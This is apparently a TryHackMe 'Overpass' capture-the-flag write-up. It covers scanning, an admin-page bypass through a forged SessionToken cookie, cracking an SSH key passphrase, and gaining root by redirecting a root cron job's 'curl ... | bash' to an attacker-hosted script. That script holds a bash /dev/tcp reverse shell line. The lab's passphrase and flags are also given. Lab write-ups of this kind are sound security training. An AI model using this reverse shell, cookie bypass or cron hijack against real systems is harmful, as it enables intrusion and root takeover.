# 🕵️‍♂️ Overpass - 1 | Writeup | 25 June 2025

<div align="center">
    <img src="./images/THM.png" alt="TryHackMe Logo" width="100%"/>
</div>
<div align="center">
    <img src="./images/overpass.png" alt="Overpass_image" width="90%"/>
</div>

---

## 🚩 Table of Contents

- [Reconnaissance & Enumeration - Task 1](#reconnaissance--enumeration---task-1)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

---

# 🕵️ Reconnaissance & Enumeration - Task 1

## 🔍 Nmap Scan

**Command:**
```bash
sudo nmap -T4 -n -sC -sV -Pn -p- -oN fastscan.txt 10.10.5.56
```
<p align="center">
  <img src="./images/nmap_scan.png" alt="Nmap Scan Screenshot" width="600"/>
</p>

---

## 📂 Directory Scan (Dirbuster)

**Command:**
```bash
dirbuster -u http://10.10.191.18/ -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```
<p align="center">
  <img src="./images/directory_scan.png" alt="Directory Scan Screenshot" width="600"/>
</p>

---

## 🔎 Web Vulnerability Scanning

**Nikto Scan:**
```bash
nikto -h http://10.10.209.74/ -o nikto_scan.txt
```
<p align="center">
  <img src="./images/nikto_scan.png" alt="Nikto Scan Screenshot" width="600"/>
</p>

---
## 🌐 Web Enumeration

- **Admin Page Discovery:**  
  <img src="./images/admin_url.png" alt="Admin URL" width="600"/>

- **Network Analysis of Admin Page:**  
  <img src="./images/admin_network.png" alt="Admin Network" width="600"/>

- **Session Manipulation:**  
  Set the cookie `SessionToken` to any value (e.g., `1`) to bypass authentication.
  <img src="./images/session_.png" alt="Session Manipulation" width="600"/>

- **Admin Dashboard Access:**  
  <img src="./images/dashboard_admin.png" alt="Admin Dashboard" width="600"/>

---

## 🔑 SSH Access

- **Extracting the RSA Private Key:**  
  Copy the RSA private key from the admin dashboard and save it locally.
  ```bash
  echo "<RSA PRIVATE KEY>" > id_rsa
  chmod 600 id_rsa
  ```
  <img src="./images/ssh_rsa.png" alt="SSH RSA Key" width="600"/>

- **Passphrase Required:**  
  <img src="./images/ssh_passphrase.png" alt="SSH Passphrase" width="600"/>

- **Cracking the Passphrase:**  
  Convert the key for John the Ripper:
  ```bash
  ssh2john id_rsa > hash.txt
  john hash.txt
  ```
  <img src="./images/ssh2john.png" alt="ssh2john" width="600"/>
  <img src="./images/crack_hash.png" alt="John the Ripper" width="600"/>

  **Credentials:**  
  - **Passphrase:** `james13`

- **SSH Login:**
  ```bash
  ssh -i id_rsa james@10.10.2.81
  ```
  <img src="./images/ssh_login.png" alt="SSH Login" width="600"/>

---

## 🏁 User Flag

- **Flag:**  
  `thm{65c1aaf000506e56996822c6281e6bf7}`
  
  <img src="./images/flag.png" alt="User Flag" width="600"/>

---

# 🚀 Privilege Escalation

- **Check Crontab for Scheduled Tasks:**
  ```bash
  cat /etc/crontab
  ```
  <img src="./images/root_access.png" alt="Crontab" width="600"/>

- **Suspicious Cron Job:**
  ```
  * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
  ```
  <img src="./images/root_pri.png" alt="Cron Job" width="600"/>

- **Host File Manipulation:**  
  Point `overpass.thm` to your attacker's IP.
  ```bash
  sudo nano /etc/hosts
  ```
  <img src="./images/host.png" alt="Host File" width="600"/>

- **Prepare Reverse Shell Script:**  
  Place your reverse shell in `/downloads/src/buildscript.sh`:
  ```bash
  bash -i >& /dev/tcp/10.8.76.195/4444 0>&1
  ```
  <img src="./images/path.png" alt="Reverse Shell Path" width="600"/>
  <img src="./images/reverse_shell.png" alt="Reverse Shell" width="600"/>

- **Serve the Payload:**
  ```bash
  python3 -m http.server 80
  ```
  <img src="./images/python_server.png" alt="Python HTTP Server" width="600"/>

- **Start Netcat Listener:**
  ```bash
  nc -lvnp 4444
  ```
  <img src="./images/listen.png" alt="Netcat Listener" width="600"/>

- **Root Shell Acquired:**
  <img src="./images/root_shell.png" alt="Root Shell" width="600"/>

- **Verify Root Access:**
  ```bash
  whoami
  ```
  <img src="./images/check_root.png" alt="Whoami Root" width="600"/>

---

## 🏁 Root Flag

- **Flag:**  
  `thm{7f336f8c359dbac18d54fdd64ea753bb}`

  <img src="./images/root_flag.png" alt="Root Flag" width="600"/>

---

# 🎯 Conclusion

- All tasks completed successfully!
  <img src="./images/completed.png" alt="Room Completed" width="600"/>

---

## 🎉 Happy Hacking!

<p align="center">
    <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
        <img src="https://media.giphy.com/media/102h4wsmCG2s12/giphy.gif" alt="Charlie Hunnam GIF" width="400"/>
    </a>
</p>

---
